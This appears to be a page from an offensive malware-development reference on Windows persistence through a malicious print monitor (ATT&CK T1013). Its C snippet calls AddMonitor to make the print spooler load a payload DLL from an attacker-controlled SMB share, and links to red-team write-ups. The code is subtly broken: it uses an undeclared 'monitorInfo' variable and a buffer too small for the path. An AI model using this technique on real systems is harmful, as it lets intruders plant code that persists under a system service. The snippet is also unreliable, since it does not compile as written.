---
author(s):
  - Userware
tags:
  - malware-development
  - maintaining-access
  - persistence
  - T1013
  - windows
---
# Print Monitor

```c
#include <windows.h>
#include <winspool.h>

#pragma comment(lib, "winspool.lib")

int main() {
    //Build the struct req by AddMonitor
    MONITOR_INFO_2 mon;
    TCHAR name[14] = TEXT("MonitorSlayer");
    TCHAR arch[12] = TEXT("Windows x64");
    TCHAR dll[39] = TEXT("\\\\<attacker_IP>\\<share_name>\\payload.dll");
    monitorInfo.pName = name;
    monitorInfo.pEnvironment = arch;
    monitorInfo.pDLLName = dll;

    //Add the monitor
    AddMonitor(NULL, 2, (LPBYTE)&mon);
    return 0;
}
```

---
## References

### Microsoft

- [WinAPI Documentation: `AddMonitor`](https://learn.microsoft.com/en-us/windows/win32/printdocs/addmonitor)

### Persistence Info

- [Persistence Info: Print Monitor](https://persistence-info.github.io/Data/printmonitor.html)

### Red Team Notes

- [Red Team Notes: `AddMonitor()`](https://www.ired.team/offensive-security/persistence/t1013-addmonitor)

### Slayer Labs

- [Slayer Labs: Windows Persistence via Port Monitors](https://posts.slayerlabs.com/monitor-persistence/)